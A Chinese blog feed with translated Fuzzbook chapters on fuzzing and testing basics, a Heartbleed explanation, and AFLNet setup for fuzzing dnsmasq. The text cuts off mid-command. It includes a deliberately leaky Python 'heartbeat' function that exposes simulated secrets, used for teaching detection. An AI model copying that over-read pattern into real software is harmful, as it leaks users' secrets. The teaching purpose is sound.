02 03 04 05 06 07   Heap left redzone:       fa  Freed heap region:       fd  Stack left redzone:      f1  Stack mid redzone:       f2  Stack right redzone:     f3  Stack after return:      f5  Stack use after scope:   f8  Global redzone:          f9  Global init order:       f6  Poisoned by user:        f7  Container overflow:      fc  Array cookie:            ac  Intra object redzone:    bb  ASan internal:           fe  Left alloca redzone:     ca  Right alloca redzone:    cb  Shadow gap:              cc==9753==ABORTING</code></pre><p>如果您想在C程序中发现错误，则为模糊测试打开此类检查相当容易。根据工具的不同，它会将执行速度降低一定的因素（对于AddressSanitizer，通常为2××），并且消耗更多的内存，但是与发现这些错误所需的人工相比，CPU周期实在是太便宜了。</p><p>对内存的越界访问具有很大的安全风险，因为它们可能使攻击者访问甚至修改并非针对他们的信息。作为一个著名的例子，<a href="https://en.wikipedia.org/wiki/Heartbleed">HeartBleed错误</a>是OpenSSL库中的一个安全错误，它实现了加密协议，该协议提供了计算机网络上的通信安全性。（如果您在浏览器中阅读此文本，则可能已使用这些协议对其进行了加密。）</p><p>通过向SSL<em>心跳</em>服务发送特制命令来利用HeartBleed错误。心跳服务用于检查另一端的服务器是否仍在运行。客户端会向服务发送一个字符串，例如</p><pre><code class="python">BIRD (4 letters)</code></pre><p>服务器将向其回复<code>BIRD</code>，并且客户端将知道服务器仍在运行。</p><p>不幸的是，这种服务可以通过要求服务器回复利用指定的一组字母。下面的<a href="https://xkcd.com/1354/">XKCD漫画</a>很好地解释了这一点：</p><p><img src="https://i.loli.net/2021/01/04/Izm9Elg1HbvxQ8h.png" alt="xkcd_heartbleed_1"></p><p><img src="https://i.loli.net/2021/01/04/2HRqkTLYBXpAtCm.png" alt="xkcd_heartbleed_2"></p><p><img src="https://i.loli.net/2021/01/04/3gl26iKmMDWTVkG.png" alt="xkcd_heartbleed_3"></p><p>在OpenSSL实现中，这些内存内容可能涉及加密证书，私钥等，而且更糟的是，没有人会注意到刚刚访问了该内存。发现HeartBleed错误后，它已经存在了很多年，没有人会知道是否泄漏了哪些秘密；哪些秘密已经泄漏。HeartBleed公告页面说明](<a href="http://heartbleed.com/)%E4%BA%86%E4%B8%80%E5%88%87%E3%80%82">http://heartbleed.com/)了一切。</a></p><p>但是如何发现HeartBleed？非常简单。Codenomicon公司以及Google的研究人员都使用内存清理器编译了OpenSSL库，然后用模糊的命令很快将其触发。然后，内存清理程序会注意到是否发生了越界内存访问-实际上，它将很快发现这一点。</p><p>内存检查器只是众多检查器之一，可在模糊检查期间运行该检查器以检测运行时错误。在后续章节我们将学习更多有关如何定义通用检查器的信息。</p><p>我们已经完成了<code>program</code>，所以我们进行清理：</p><pre><code class="python">!rm -fr program program.*</code></pre><h6 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h6><p>信息泄漏不仅可能通过非法的内存访问而发生；它们也可能出现在“有效”内存中-如果此“有效”内存包含不应泄漏的敏感信息。让我们在Python程序中说明此问题。首先，让我们创建一些程序存储器，其中填充了实际数据和随机数据：</p><pre><code class="python">secrets = (&quot;&lt;space for reply&gt;&quot; + fuzzer(100)     + &quot;&lt;secret-certificate&gt;&quot; + fuzzer(100)     + &quot;&lt;secret-key&gt;&quot; + fuzzer(100) + &quot;&lt;other-secrets&gt;&quot;)</code></pre><p>我们向中添加了更多的“内存”字符<code>secrets</code>，并用它们<code>&quot;deadbeef&quot;</code>作为未初始化内存的标记：</p><pre><code class="python">uninitialized_memory_marker = &quot;deadbeef&quot;while len(secrets) &lt; 2048:    secrets += uninitialized_memory_marker</code></pre><p>我们定义了一个服务（类似于上面讨论的心跳服务），该服务将接收答复并发送回一个长度。它会将要发送的回复存储在内存中，然后以给定的长度发送回去。</p><pre><code class="python">def heartbeat(reply, length, memory):    # Store reply in memory    memory = reply + memory[len(reply):]    # Send back heartbeat    s = &quot;&quot;    for i in range(length):        s += memory[i]    return s</code></pre><p>这非常适合标准字符串：</p><pre><code class="python">heartbeat(&quot;potato&quot;, 6, memory=secrets)</code></pre><pre><code class="python">&#39;potato&#39;</code></pre><pre><code class="python">heartbeat(&quot;bird&quot;, 4, memory=secrets)</code></pre><pre><code class="python">&#39;bird&#39;</code></pre><p>但是，如果该长度大于应答字符串的长度，则会溢出其他内存内容。请注意，所有这些仍然在常规数组范围内发生，因此不会触发地址清理器：</p><pre><code class="python">heartbeat(&quot;hat&quot;, 500, memory=secrets)</code></pre><pre><code class="python">&#39;hatace for reply&gt;#,,!3?30&gt;#61)$4--8=&lt;7)4 )03/%,5+! &quot;4)0?.9+?3();&lt;42?=?0&lt;secret-certificate&gt;7(+/+((1)#/0\&#39;4!&gt;/&lt;#=78%6$!!$&lt;-&quot;3&quot;\&#39;-?1?85!05629%/); *)1\&#39;/=9%&lt;secret-key&gt;.(#.4%&lt;other-secrets&gt;deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadb&#39;</code></pre><p>一个人如何发现这种问题？这个想法是要识别不应该泄漏的信息，例如给定的机密，以及未初始化的内存。我们可以在一个小的Python示例中模拟这种检查：</p><pre><code class="python">from ExpectError import ExpectError</code></pre><pre><code class="python">with ExpectError():    for i in range(10):        s = heartbeat(fuzzer(), random.randint(1, 500), memory=secrets)        assert not s.find(uninitialized_memory_marker)        assert not s.find(&quot;secret&quot;)</code></pre><pre><code class="python">Traceback (most recent call last):  File &quot;&lt;ipython-input-44-b7e8a1210599&gt;&quot;, line 4, in &lt;module&gt;    assert not s.find(uninitialized_memory_marker)AssertionError (expected)</code></pre><p>通过这种检查，我们发现机密和/或未初始化的内存确实泄漏了。在以后有关信息流的章节中，我们将讨论如何自动执行此操作，“污染”敏感信息及其衍生的值，并确保“污染”的值不会泄漏出去。</p><p>根据经验，在模糊测试期间，应始终<em>启用尽可能多的自动检查器</em>。CPU周期便宜，错误也很昂贵。如果仅执行该程序而没有实际检测错误的选项，那么您将失去几个发现漏洞机会。</p><h3 id="经验教训"><a href="#经验教训" class="headerlink" title="经验教训"></a>经验教训</h3><ul><li>随机生成输入（“模糊测试”）是一种简单，经济高效的方法，可以快速测试任意程序的健壮性。</li><li>模糊器发现的错误主要是由于<em>输入处理中的</em>错误和不足。</li><li>要捕获错误，请具有尽可能多的<em>一致性检查</em></li></ul><h3 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h3><ul><li>在现有输入上使用<em>变异</em>以获得更多有效输入</li><li>使用<em>语法</em>指定输入格式，从而获得更多有效输入</li><li>减少<em>失败的输入</em>以进行有效的调试</li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> 新趋势 </tag>
            
            <tag> Fuzzbook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzbook1——软件的安全性测试</title>
      <link href="2020/12/02/fuzzbook1%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
      <url>2020/12/02/fuzzbook1%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.3001.net/images/20210111/1610358571_5ffc1f2b95e569df29bae.png!small" alt="image-20201005165901975"></p><p>本章我们先介绍软件测试的基本概念。为什么需要测试软件？一个测试软件如何运转的？如何判断测试是否成功？如何判断是否测试足够？在本章中，我们将回顾这些重要的概念，并同时熟悉Python的基本用法。</p><a id="more"></a><h3 id="简单的测试"><a href="#简单的测试" class="headerlink" title="简单的测试"></a>简单的测试</h3><p>让我们从一个简单的例子开始，您希望实现平方根函数 $\begin{align*}\sqrt {x}\end{align*}$。（让我们暂时假设环境没用这一个小功能）在研究了<a href="https://en.wikipedia.org/wiki/Newton's_method">Newton-Raphson方法之后</a>，提出了以下Python代码，通过<code>my_sqrt()</code>函数计算平方根。</p><pre><code class="python">def my_sqrt(x):    &quot;&quot;&quot;Computes the square root of x, using the Newton-Raphson method&quot;&quot;&quot;    approx = None    guess = x / 2    while approx != guess:        approx = guess        guess = (approx + x / approx) / 2    return approx</code></pre><p>现在，让我们看看此功能函数是否真正按照规范执行。</p><h3 id="了解python"><a href="#了解python" class="headerlink" title="了解python"></a>了解python</h3><p>如果您不熟悉Python，则可能首先必须了解以上代码的功能。我们非常推荐<a href="https://docs.python.org/3/tutorial/">Python教程，</a>以了解Python的工作原理。对于您来说，理解以上代码最重要的是以下三个：</p><ol><li>Python通过**<em>缩进**</em>构造程序，因此函数和<code>while</code>主体是通过缩进来定义的；</li><li>Python是**<em>动态类型**</em>的，这意味着变量的类型像<code>x</code>，<code>approx</code>或<code>guess</code>在运行时才被确定。</li><li>大多数的Python的句法特征是由其他语言启发的，如控制结构（<code>while</code>，<code>if</code>），等号（<code>=</code>），或比较（<code>==</code>，<code>!=</code>，<code>&lt;</code>）。</li></ol><p>就这样，你已经可以理解上面的代码做什么：用开始<code>guess</code>的<code>x / 2</code>，它计算好近似<code>approx</code>直到值<code>approx</code>不再改变。这是最终返回的值。</p><h3 id="运行功能函数"><a href="#运行功能函数" class="headerlink" title="运行功能函数"></a>运行功能函数</h3><p>为了确定是否<code>my_sqrt()</code>正常工作，我们可以使用一些值对其进行<em>测试</em>。例如<code>x = 4</code>，对于，它将产生正确的值：</p><pre><code class="python">my_sqrt （4 ）2.0</code></pre><p>上面的上部<code>my_sqrt(4)</code>是Python解释器的输入，默认情况下对它进行运行。下部（<code>2.0</code>）是其输出。我们可以看到<code>my_sqrt(4)</code>产生正确的值。</p><p>这同样适用于<code>x = 2.0</code>：</p><pre><code class="python">my_sqrt （2 ）1.414213562373095</code></pre><h3 id="调试功能函数"><a href="#调试功能函数" class="headerlink" title="调试功能函数"></a>调试功能函数</h3><p>为了解<code>my_sqrt()</code>操作方式，一种简单的策略是<code>print()</code>在关键位置插入语句。例如，您可以记录的值<code>approx</code>，以查看每次循环迭代如何接近实际值：</p><pre><code class="python">def my_sqrt_with_log(x):    &quot;&quot;&quot;Computes the square root of x, using the Newton–Raphson method&quot;&quot;&quot;    approx = None    guess = x / 2    while approx != guess:        print(&quot;approx =&quot;, approx)  # &lt;-- New        approx = guess        guess = (approx + x / approx) / 2    return approx</code></pre><pre><code class="python">my_sqrt_with_log(9)</code></pre><pre><code class="python">approx = Noneapprox = 4.5approx = 3.25approx = 3.0096153846153846approx = 3.000015360039322approx = 3.00000000003932143.0</code></pre><p>这样我们就可以观察到每次运行时的内部细节，以排查问题。</p><h3 id="检查功能函数"><a href="#检查功能函数" class="headerlink" title="检查功能函数"></a>检查功能函数</h3><p>让我们回到测试。我们可以阅读并运行代码，但是上面的值<code>my_sqrt(2)</code>实际上正确吗？我们可以通过利用<br>$$<br>\begin{align*}\sqrt {x} * \sqrt {x} = x\end{align*}<br>$$<br>。让我们来看看：</p><pre><code class="python">my_sqrt （2 ） *  my_sqrt （2 ）</code></pre><pre><code class="python">1.9999999999999996</code></pre><p>看起来确实有一些四舍五入上的错误出现了</p><p>现在，我们已经<em>测试</em>了上面的程序：我们已经在给定的输入上<em>执行了</em>该程序，并<em>检查了</em>其结果是否正确。在程序投入生产之前，这种测试是质量保证的最低限度。</p><h3 id="自动化测试执行"><a href="#自动化测试执行" class="headerlink" title="自动化测试执行"></a>自动化测试执行</h3><p>到目前为止，我们已经<em>手动</em>测试了上述程序，即，<em>手动</em>运行它并手动检查其结果。这是一种非常灵活的测试方法，但是从长远来看，它效率很低：</p><ol><li>手动测试，您只能检查非常有限的执行及其结果</li><li>对程序进行任何更改后，您必须重复测试过程</li></ol><p>这就是为什么<em>自动化</em>测试非常有用的原因。一种简单的方法是让计算机首先进行计算，然后让计算机检查结果。</p><p>例如，这段代码自动测试<br>$$<br>\begin{align*}\sqrt {4}= 2\end{align*}<br>$$<br>：</p><pre><code class="python">result = my_sqrt(4)expected_result = 2.0if result == expected_result:    print(&quot;Test passed&quot;)else:    print(&quot;Test failed&quot;)</code></pre><pre><code class="python">Test passed</code></pre><p>这个测试的好处是我们可以一次又一次地运行它，从而确保至少正确计算了4的平方根。但是，仍然存在许多问题：</p><ol><li>单个测试需要<em>五行代码</em></li><li>我们不在乎舍入错误</li><li>我们仅检查单个输入（和单个结果）</li></ol><p>让我们一一解决这些问题。首先，让我们使测试更加紧凑。几乎所有的编程语言都可以自动检查条件是否成立，如果条件不成立则停止执行。这称为<em>断言</em>，对于测试非常有用。</p><p>在Python中，我们使用<code>assert</code>语句，如果条件为true，则什么也不会发生。（如果一切正常，则不应该出问题。）但是，如果条件评估为false，<code>assert</code>则会引发异常，表明测试刚刚失败。</p><p>在我们的示例中，我们可以<code>assert</code>轻松地检查是否<code>my_sqrt()</code>产生了上述预期结果：</p><pre><code class="python">assert my_sqrt(4) == 2</code></pre><p>当您执行此行代码时，什么都不会发生：我们证明（或断言）我们确认了<br>$$<br>\begin{align*}\sqrt {4}= 2\end{align*}<br>$$<br>但是请记住，浮点计算可能会导致舍入误差。因此，我们不能简单地比较两个浮点数是否相等。因此，我们将确保它们之间的绝对差保持在某个阈值以下，通常表示为$\epsilon$或<code>epsilon</code>。这是我们可以做到的：</p><pre><code class="python">EPSILON = 1e-8</code></pre><pre><code class="python">assert abs(my_sqrt(4) - 2) &lt; EPSILON</code></pre><p>P.S. abs（）求绝对值</p><p>我们还可以为此目的引入一个特殊功能，现在对具体值进行更多测试：</p><pre><code class="python">def assertEquals(x, y, epsilon=1e-8):    assert abs(x - y) &lt; epsilon</code></pre><pre><code class="python">assertEquals(my_sqrt(4), 2)assertEquals(my_sqrt(9), 3)assertEquals(my_sqrt(100), 10)</code></pre><p>似乎可以工作，对吧？如果我们知道计算的预期结果，则可以一次又一次地使用此类断言，以确保我们的程序正确运行。</p><h3 id="进一步生成测试"><a href="#进一步生成测试" class="headerlink" title="进一步生成测试"></a>进一步生成测试</h3><p>还记得<br>$$<br>\begin{align*}\sqrt {x} * \sqrt {x} = x\end{align*}<br>$$<br>普遍恒成立吗？我们还可以使用一些值来明确地测试它：</p><pre><code class="python">assertEquals(my_sqrt(2) * my_sqrt(2), 2)assertEquals(my_sqrt(3) * my_sqrt(3), 3)assertEquals(my_sqrt(42.11) * my_sqrt(42.11), 42.11)</code></pre><p>似乎仍然有效，对不对？最重要的是通过 $\begin{align*}\sqrt {x} * \sqrt {x} = x\end{align*}$我们可以测试成千上万的值：</p><pre><code class="python">for n in range(1, 1000):    assertEquals(my_sqrt(n) * my_sqrt(n), n)</code></pre><p><code>my_sqrt()</code>用100个值测试需要多少时间？让我们来看看。</p><p>我们使用自己的<a href="https://www.fuzzingbook.org/beta/html/Timer.html"><code>Timer</code>模块</a>来测量经过时间。为了能够使用<code>Timer</code>，我们首先导入我们自己的实用程序模块。</p><pre><code class="python">import bookutils</code></pre><pre><code class="python">from Timer import Timer</code></pre><pre><code class="python">with Timer() as t:    for n in range(1, 10000):        assertEquals(my_sqrt(n) * my_sqrt(n), n)print(t.elapsed_time())</code></pre><pre><code class="python">0.022911809000106587</code></pre><p>10,000个值大约需要百分之一秒，因此单次执行<code>my_sqrt()</code>需要1/1000000秒或大约1微秒。</p><p>让我们重复随机选择10,000个值。Python<code>random.random()</code>函数返回0.0到1.0之间的随机值：</p><pre><code class="python">import random</code></pre><pre><code class="python">with Timer() as t:    for i in range(10000):        x = 1 + random.random() * 1000000        assertEquals(my_sqrt(x) * my_sqrt(x), x)print(t.elapsed_time())</code></pre><pre><code class="python">0.02770466199990551</code></pre><p>一秒钟之内，我们现在测试了10,000个随机值，并且每次实际上都正确计算了平方根。只要对进行任何更改<code>my_sqrt()</code>，我们就可以重复进行此测试，每次都可以增强我们<code>my_sqrt()</code>没有隐患的信心。但是请注意，尽管随机函数在产生随机值方面没有<em>偏见</em>，但不太可能生成会极大改变程序行为的特殊值。我们将在下面稍后讨论。</p><h3 id="在运行时验证"><a href="#在运行时验证" class="headerlink" title="在运行时验证"></a>在运行时验证</h3><p>除了为编写和运行测试外<code>my_sqrt()</code>，我们还可以<em>将检查权限集成到实现中。</em> 这样，将自动检查<em>每次</em>调用<code>my_sqrt()</code>。</p><p>这样的<em>自动运行时检查</em>非常容易实现：</p><pre><code class="python">def my_sqrt_checked(x):    root = my_sqrt(x)    assertEquals(root * root, x)    return root</code></pre><p>现在，无论何时我们用 <code>my_sqrt_checked()</code>…</p><pre><code class="python">my_sqrt_checked(2.0)</code></pre><pre><code class="python">1.414213562373095</code></pre><p>我们已经知道结果是正确的，并且对于每次新的成功计算都是如此。</p><p>如上所述，自动运行时检查假设有两件事：</p><ul><li>必须能够<em>制定</em>这种运行时检查。始终有可能要检查具体的值，但是以抽象的方式制定所需的属性可能非常复杂。在实践中，您需要确定哪些属性最关键，并为它们设计适当的检查。另外，运行时检查可能不仅取决于本地属性，还取决于程序状态的多个属性，所有这些属性都必须确定。</li><li>必须能够<em>负担得起</em>此类运行时检查。在的情况下<code>my_sqrt()</code>，运行花费不是很大；但是，即使经过简单的操作，如果我们不得不检查大型数据结构，那么检查的费用很快就会变得昂贵。在实践中，通常会在生产过程中禁用运行时检查，以确保可靠性为代价。另一方面，一套全面的运行时检查是发现错误并快速调试它们的好方法。您需要确定在生产期间仍需要多少种这样的功能。</li></ul><h3 id="系统输入与函数输入"><a href="#系统输入与函数输入" class="headerlink" title="系统输入与函数输入"></a>系统输入与函数输入</h3><p>在这一部分，我们会把<code>my_sqrt()</code>提供给其他程序员，然后他们可以将其嵌入他们的代码中。在某些时候，它必须处理来自<em>第三方的</em>输入，即不受程序员的控制。</p><p>让我们通过假设一个<em>程序</em>的输入为第三方控制的字符串来模拟此<em>系统输入</em>：<code>sqrt_program()</code></p><pre><code class="python">def sqrt_program(arg):    x = int(arg)    print(&#39;The root of&#39;, x, &#39;is&#39;, my_sqrt(x))</code></pre><p>我们假设这<code>sqrt_program</code>是一个接受命令行输入的程序，如下所示：</p><pre><code class="python">$ sqrt_program 42</code></pre><p>我们可以对<code>sqrt_program()</code>通过一些系统输入进行调用：</p><pre><code class="python">sqrt_program(&quot;4&quot;)</code></pre><pre><code class="python">The root of 4 is 2.0</code></pre><p>这有什么问题？好吧，问题在于我们不检查外部输入的有效性。例如<code>sqrt_program(-1)</code>尝试调用。怎么办？</p><p>实际上，如果您<code>my_sqrt()</code>使用负数调用，它将进入无限循环。由于技术原因，本章不能有无限循环（除非我们希望代码永远运行）。因此，我们使用一种特殊的<code>with ExpectTimeOut(1)</code>构造在一秒钟后中断执行。</p><pre><code class="python">from ExpectError import ExpectTimeout</code></pre><pre><code class="python">with ExpectTimeout(1):    sqrt_program(&quot;-1&quot;)</code></pre><pre><code class="python">Traceback (most recent call last):  File &quot;&lt;ipython-input-25-add01711282b&gt;&quot;, line 2, in &lt;module&gt;    sqrt_program(&quot;-1&quot;)  File &quot;&lt;ipython-input-22-53e8ec8bb3ca&gt;&quot;, line 3, in sqrt_program    print(&#39;The root of&#39;, x, &#39;is&#39;, my_sqrt(x))  File &quot;&lt;ipython-input-1-47185ad159a1&gt;&quot;, line 7, in my_sqrt    guess = (approx + x / approx) / 2  File &quot;&lt;ipython-input-1-47185ad159a1&gt;&quot;, line 7, in my_sqrt    guess = (approx + x / approx) / 2  File &quot;ExpectError.ipynb&quot;, line 59, in check_timeTimeoutError (expected)</code></pre><p>上面的消息是<em>错误消息</em>，表明出了点问题。它列出了错误发生时处于活动状态的函数和行的<em>调用堆栈</em>。最底部的行是最后执行的行；上面的几行代表函数调用–在我们的例子中，最大为<code>my_sqrt(x)</code>。</p><p>我们不希望我们的代码以异常终止。因此，在接受外部输入时，我们必须确保已对其进行正确验证。我们可以写例如：</p><pre><code class="python">def sqrt_program(arg):    x = int(arg)    if x &lt; 0:        print(&quot;Illegal Input&quot;)    else:        print(&#39;The root of&#39;, x, &#39;is&#39;, my_sqrt(x))</code></pre><p>然后我们可以确保<code>my_sqrt()</code>仅根据其规范进行调用。</p><pre><code class="python">sqrt_program （“ -1” ）</code></pre><pre><code class="python">Illegal Input</code></pre><p>可是等等！如果<code>sqrt_program()</code>不使用数字调用怎么办？然后，我们将尝试转换非数字字符串，这也会导致运行时错误：</p><pre><code class="python">from ExpectError import ExpectError</code></pre><pre><code class="python">with ExpectError():    sqrt_program(&quot;xyzzy&quot;)</code></pre><pre><code class="python">Traceback (most recent call last):  File &quot;&lt;ipython-input-29-8c5aae65a938&gt;&quot;, line 2, in &lt;module&gt;    sqrt_program(&quot;xyzzy&quot;)  File &quot;&lt;ipython-input-26-ea86281b33cf&gt;&quot;, line 2, in sqrt_program    x = int(arg)ValueError: invalid literal for int() with base 10: &#39;xyzzy&#39; (expected)</code></pre><p>这是一个还会检查输入错误的版本：</p><pre><code class="python">def sqrt_program(arg):    try:        x = float(arg)    except ValueError:        print(&quot;Illegal Input&quot;)    else:        if x &lt; 0:            print(&quot;Illegal Number&quot;)        else:            print(&#39;The root of&#39;, x, &#39;is&#39;, my_sqrt(x))</code></pre><pre><code class="python">sqrt_program(&quot;4&quot;)The root of 4.0 is 2.0sqrt_program(&quot;-1&quot;)Illegal Numbersqrt_program(&quot;xyzzy&quot;)Illegal Input</code></pre><p>现在我们已经看到，在系统级别，程序必须能够优雅地处理任何类型的输入，而永远不会进入不受控制的状态。当然，这对于程序员来说是负担，他们必须努力使自己的程序在所有情况下都健壮起来。但是，这种负担在生成软件测试时会成为一个<em>好处</em>：如果程序可以处理任何类型的输入（可能带有定义良好的错误消息），我们也可以<em>将其发送给任何类型的输入</em>。但是，当使用生成的值调用函数时，我们必须<em>知道</em>其精确的先决条件。</p><h3 id="测试的极限"><a href="#测试的极限" class="headerlink" title="测试的极限"></a>测试的极限</h3><p>尽管在测试方面付出了最大的努力，但请记住，您始终在检查功能是否有一组<em>有限</em>的输入。因此，可能总是存在<em>未经测试的</em>输入，其功能可能仍会失败。</p><p>在的情况下<code>my_sqrt()</code>，例如，计算 $\begin{align*}\sqrt {0}\end{align*}$：</p><pre><code class="python">with ExpectError():    root = my_sqrt(0)</code></pre><pre><code class="python">Traceback (most recent call last):  File &quot;&lt;ipython-input-34-24ede1f53910&gt;&quot;, line 2, in &lt;module&gt;    root = my_sqrt(0)  File &quot;&lt;ipython-input-1-47185ad159a1&gt;&quot;, line 7, in my_sqrt    guess = (approx + x / approx) / 2ZeroDivisionError: float division by zero (expected)</code></pre><p>到目前为止，在我们的测试中，我们还没有检查这种情况，这意味着要建立在 $\begin{align*}\sqrt {0}=0\end{align*}$会出人意料地失败。但是，即使我们将随机生成器设置为产生0–1000000而不是1–1000000的输入，它偶然产生零值的机会仍然是百万分之一。如果对于几个单独的值，函数的行为完全不同，则纯随机测试几乎没有机会产生这些值。</p><p>当然，我们可以相应地修复功能，记录可接受的值<code>x</code>并处理特殊情况<code>x = 0</code>：</p><pre><code class="python">def my_sqrt_fixed(x):    assert 0 &lt;= x    if x == 0:        return 0    return my_sqrt(x)</code></pre><p>这样，我们现在可以正确地计算  $\begin{align*}\sqrt {0}=0\end{align*}$</p><pre><code class="python">assert my_sqrt_fixed(0) == 0</code></pre><p>非法值现在导致异常：</p><pre><code class="python">with ExpectError():    root = my_sqrt_fixed(-1)</code></pre><pre><code class="python">Traceback (most recent call last):  File &quot;&lt;ipython-input-37-55b1caf1586a&gt;&quot;, line 2, in &lt;module&gt;    root = my_sqrt_fixed(-1)  File &quot;&lt;ipython-input-35-f3e21e80ddfb&gt;&quot;, line 2, in my_sqrt_fixed    assert 0 &lt;= xAssertionError (expected)</code></pre><p>仍然，我们必须记住，尽管广泛的测试可以使我们对程序的正确性有很高的信心，但它不能保证所有将来的执行都是正确的。甚至检查每个结果的运行时验证也只能保证，<em>如果</em>产生一个结果，那么结果将是正确的。但不能保证将来的执行不会导致检查失败。在撰写本文时，我<em>相信</em>这<code>my_sqrt_fixed(x)</code>是$\begin{align*}\sqrt {x}\end{align*}$，但我不能100％确定。</p><h3 id="经验教训"><a href="#经验教训" class="headerlink" title="经验教训"></a>经验教训</h3><ul><li>测试的目的是执行一个程序，以便我们发现错误。</li><li>测试执行，测试生成和检查测试结果可以自动化。</li><li>测试<em>不完整</em>; 它不提供100％保证代码没有错误的保证。</li></ul><h3 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h3><p>构建你自己的模糊测试—用随机输入测试程序</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> 新趋势 </tag>
            
            <tag> Fuzzbook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Aflnet简单实践</title>
      <link href="2020/11/02/aflnet/"/>
      <url>2020/11/02/aflnet/</url>
      
        <content type="html"><![CDATA[<p> AFLNET是一个基于AFL开发的网络协议测试工,已在2020年ICST上被接受发布,本文简单尝试使用。</p><a id="more"></a><p>AFLNET是一个基于AFL开发的网络协议测试工具，其最大的优点在于有效地利用了服务器的响应信息，以指导下一次的Fuzz。</p><p> 有状态的黑盒模糊检测（SBF）是目前比较受欢迎的fuzz方法，学术界Sulley或BooFuzz，工业界的Peach，特点是利用FSM或者图遍历协议模型，并生成符合语法的消息序列。这种方法虽部分解决了第一个挑战，但是其的效果通常取决与设计的状态模型，这种模型通常需要由有经验的分析者/开发者基于对该协议的知识，以及结合端点之间的网络流量具体设计。设计的模型可能不会百分百符合黑盒内的协议，毕竟网络协议的实现取决于各个开发者，可能存在对协议的误解，或是实现时增加新的特性。此外现有的SBF方法尽管可以生成一些数据去触发一些特殊状态，然而并未将这类数据进行保留以指导未来的fuzz行为，例如，并不会更新现有的状态模型。针对这个问题，AFLNET的解决方案是比较合理的。</p><p> 其流程可以描述如下:程序的输入是数据包文件，程序内部的parser会对数据包进行分析，Parser随协议不同而采用不同设计，目的在于解析出Request请求，这些请求将组合为一个个序列，作为序列数据集。数据集中的序列会通过Mutator变异后发往Server，Server对request返回response，response数据包将被程序捕获，提取其中的状态码，判断该状态码位于FSM的何处，若原本的模型中不存在该状态码，则FSM中会增加一个结点代表该状态。程序中的State Selector将会分析程序当前的FSM模型，从中选出较少遍历/未曾遍历的状态（这是通过一个优先级机制实现的），传递给sequence selector，使之选择出可以触发该状态的request序列。当然，一开始由于缺乏统计信息，State的选取是随机化的。</p><p><img src="https://i.loli.net/2020/10/05/Zylq4FunIUhm6JR.png" alt="image-20201005165901975"></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>aflnet官方的教程非常详细，首先下载</p><pre><code class="shell"># First, clone this AFLNet repository to a folder named aflnetgit clone &lt;links to the repository&gt; aflnet# Then move to the source code foldercd aflnetmake clean allcd llvm_mode# The following make command may not work if llvm-config cannot be found# To fix this issue, just set the LLVM_CONFIG env. variable to the specific llvm-config version on your machine# On Ubuntu 18.04, it could be llvm-config-6.0 if you have installed clang using apt-getmake# Move to AFLNet&#39;s parent foldercd ../..export AFLNET=$(pwd)/aflnetexport WORKDIR=$(pwd)</code></pre><p>aflnet的用法和afl非常相似，可以afl –help查看详情</p><ul><li><strong><em>-N netinfo</em></strong>: server information 服务器信息 (e.g., tcp://127.0.0.1/8554)</li><li><strong><em>-P protocol</em></strong>: application protocol to be tested 目标的协议类型 (e.g., RTSP, FTP, DTLS12, DNS)</li><li><strong><em>-D usec</em></strong>: (optional) waiting time (in micro seconds) for the server to complete its initialization 等待时间</li><li><strong><em>-K</em></strong> : (optional) send SIGTERM signal to gracefully terminate the server after consuming all request messages  使用所有请求消息后发送SIGTERM信号以正常终止服务器</li><li><strong><em>-E</em></strong> : (optional) enable state aware mode 启动状态感知模式</li><li><strong><em>-R</em></strong> : (optional) enable region-level mutation operators 启用区域级别的突变运算符</li><li><strong><em>-F</em></strong> : (optional) enable false negative reduction mode </li><li><strong><em>-c script</em></strong> : (optional) name or full path to a script for server cleanup 服务器清理脚本的名称或完整路径</li><li><strong><em>-q algo</em></strong>: (optional) state selection algorithm 状态选择算法(e.g., 1. RANDOM_SELECTION, 2. ROUND_ROBIN, 3. FAVOR)</li><li><strong><em>-s algo</em></strong>: (optional) seed selection algorithm种子选择算法 (e.g., 1. RANDOM_SELECTION, 2. ROUND_ROBIN, 3. FAVOR)</li></ul><p><strong>实例命令：</strong></p><pre><code class="shell">afl-fuzz -d -i in -o out -N &lt;server info&gt; -x &lt;dictionary file&gt; -P &lt;protocol&gt; -D 10000 -q 3 -s 3 -E -K -R &lt;executable binary and its arguments (e.g., port number)&gt;</code></pre><h3 id="实践–以dnsmasq为例"><a href="#实践–以dnsmasq为例" class="headerlink" title="实践–以dnsmasq为例"></a>实践–以dnsmasq为例</h3><p>首先下载dnsmasq的源码,切换版本到2.73，使用afl-clang-fast进行编译</p><pre><code class="shell"># Assuming AFLNet is in ~/aflnetexport AFLNET=$HOME/aflnetexport WORKDIR=$HOMEexport AFL_PATH=$AFLNETif [[ ! $PATH == *&quot;$AFLNET&quot;* ]]; then export PATH=$AFLNET:$PATH; ficd ~# Clone the Dnsmasq repositorygit clone git://thekelleys.org.uk/dnsmasq.git# Move to the directorycd dnsmasq# Checkout a specific versiongit checkout v2.73rc6# Compile sourceCC=$AFLNET/afl-clang-fast make# Copy configuration filesudo cp $AFLNET/tutorials/dnsmasq/dnsmasq.conf /etc/# Move to the src directorycd src/</code></pre><p>成功编译Dnsmasq之后，我们可以通过添加地址来解析并<code>dig</code>用于查询主机名来测试服务器：</p><pre><code class="shell"># Add an address to resolveecho address=/test.com/5.5.5.5 | sudo tee -a /etc/dnsmasq.conf# 